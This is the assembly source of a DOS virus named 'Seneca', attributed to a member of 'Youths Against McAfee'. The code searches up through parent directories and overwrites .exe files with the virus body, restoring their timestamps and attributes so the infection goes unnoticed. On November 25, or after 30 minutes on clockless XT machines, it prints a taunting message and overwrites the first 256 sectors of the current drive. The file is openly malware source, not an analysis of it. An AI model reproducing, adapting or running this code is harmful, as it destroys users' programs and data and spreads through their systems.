;****************************************************************************
; Seneca Virus
;
; Written by Admiral Bailey - Youths Against McAfee
; Notes :
;       Non resident exe overwriting infector.  Goes on on november 25.
;       At that time it formats the current drive.  And it changes
;       directories while looking for files to infect.  After looking back on
;       this code I couldn't believe I actually wrote it.  Oh well we all
;       start somewhere.
;****************************************************************************

month   equ     11                      ; Seneca's birthday
day     equ     25                      ; November 25th

xt_time equ     30                      ; Number of minutes to give on an xt
                                        ;  with no clock on it
dta     equ     80h                     ; data transfer area

code    segment
        assume  ds:code, ss:code, cs:code, es:code
        org     100h                    ; Make it a .com file

virus_start     equ     $

seneca:
        jmp     mess_up_2               ; Just for encryption
        nop                             ; how lame.  I actually though this
        nop                             ; would work.. haha. The good old
        nop                             ; times

mess_up_1:               
        jmp     sen_virus                         
        nop                 
        nop

mess_up_2:
        jmp     mess_up_1
        nop
        nop
        nop

sen_virus:                              ; Real start of virus

test_year:
        mov     ah,2ah                  ; Get the date from computer
        int     21h
        cmp     cx,1980                 ; XT's usually don't have clocks
        jle     must_be_xt              ; So give the guy xt_time minutes
        jmp     test_month              ; If not xt then test the month
          
test_month:
        mov     ah,2ah                  ; Get the date from computer
        int     21h                     ; Do it
        cmp     dh,month                ; Compare month with comp. month
        je      test_day                ; If equal then test the day
        jmp     find_first_file         ; Nope then quit
                   
test_day:
        mov     ah,2ah                  ; Get the date from computer
        int     21h                     ; Do it
        cmp     dl,day                  ; Is it the right day?
        je      disp_messege            ; Yes then do thing
        jmp     find_first_file         ; No then find a file

must_be_xt:                             ; Only got here because year is 1980
        mov     ah,2ch                  ; Get the time
        int     21h                     ; Do it
        cmp     cl,xt_time              ; Is it past the xt_time given?
        jge     xt_messege              ; Yes the kill current drive...
        jmp     find_first_file         ; No then quit

find_first_file:
        mov     dx,offset file_type     ; Load the type of file to look for
        mov     ah,4eh                  ; Find first file command
        xor     cx,cx                   ; Clear cx find only normal
        int     21h                     ; find the first file
        jc      change_dir              ; if none found change directory
        jmp     infect                  ; if found then infect
                
find_next_file:                         
        mov     ah,4fh                  ; find next file command
        int     21h                     ; do it
        cmp     ax,12h                  ; any more files?
        je      change_dir              ; nope then change dir
        jmp     infect                  ; yup then infect
        

change_dir:
        mov     dx,offset directory     ; Directory to change to ".."
        mov     ah,3bh                  ; Change dir command
        int     21h                     ; change dir
        jc      quit                    ; if cant change dir then quit
        jmp     find_first_file         ; now that we've changed find files

xt_messege:                             ; displays messege on XT's
        mov     ah,9                    ; Display string function
        mov     dx,offset messege2      ; Locate the xtstring
        int     21h                     ; Display the xtstring
        jmp     kill_drive              ; Then kill drive.

disp_messege:                           ; Display messege on comp. with clock
        mov     ah,9                    ; Display string function
        mov     dx,offset messege       ; Locate the string
        int     21h                     ; Display the string

kill_drive:
        mov     ah,19h                  ; Get current drive (al=drive)
        int     21h                     ; Do it
        mov     cx,0ffh                 ; Fry 256 sectors
        mov     dx,0                    ; Start at sector 0
        int     26h                     ; Do it
        jc      quit                    ; If error then quit

quit:
        int     20h

infect:
        mov     bx,dta                  ; put dta in bx
        mov     ax,[bx]+15h             ; get files attribute
        mov     orig_attr,ax            ; save attribute
        mov     ax,[bx]+16h             ; get current files time
        mov     orig_time,ax            ; save current files time
        mov     ax,[bx]+18h             ; get current file date
        mov     orig_date,ax            ; save current files date
        mov     al,2                    ; set up to open handle for read/write
        mov     ah,3dh                  ; open file handle command
        int     21h                     ; do it
        mov     handle,ax               ; save current file handle
        mov     bx,handle               ; get the file handle
        mov     ah,3eh                  ; close it for now
        int     21h
        mov     ah,3dh                  ; open again to reset handle
        mov     dx,dta+1eh              ; moves filename into dx
        mov     al,2
        int     21h
        mov     handle,ax               ; save handle again
        mov     bx,handle               ; put handle in bx
        mov     cx,virus_length         ; put size of virus in cx
        mov     dx,code_start           ; where the code starts
        mov     ah,40h                  ; write to handle command
        int     21h                     ; write virus into file
        mov     bx,handle               ; get handle of stack
        mov     cx,orig_time            ; get original time
        mov     dx,orig_date            ; get original date
        mov     al,1                    ; set file date/time service
        mov     ah,57h                  ; get/set file date and time
        int     21h                     ; call dos
        mov     bx,handle               ; get handle
        mov     ah,3eh                  ; close handle service
        int     21h                     ; do it
        mov     cx,orig_attr            ; get files original attribute
        mov     al,1                    ; put it back
        mov     dx,dta+1eh              ; get filename
        mov     ah,43h                  ; dos command
        int     21h                     
        jmp     find_next_file          ; now find another file

messege db      'HEY EVERYONE!!!',13,10 ; b-day string
        db      'Its Seneca''s B-Day!  Let''s Party!',13,10
        db      '$'

messege2 db      'You shouldn''t use your computer so much,',13,10
         db      'its bad for you and your computer.',13,10 ; xt string
         db      '$'

file_type       db      '*.exe',0
directory       db      '..',0     
orig_attr       dw      ?
orig_time       dw      ?
orig_date       dw      ?                                                
handle  dw      ?
code_start      equ     100h

virus_end       equ     $

virus_length    =       virus_end - virus_start         ;length of virus


code    ends

        end     seneca


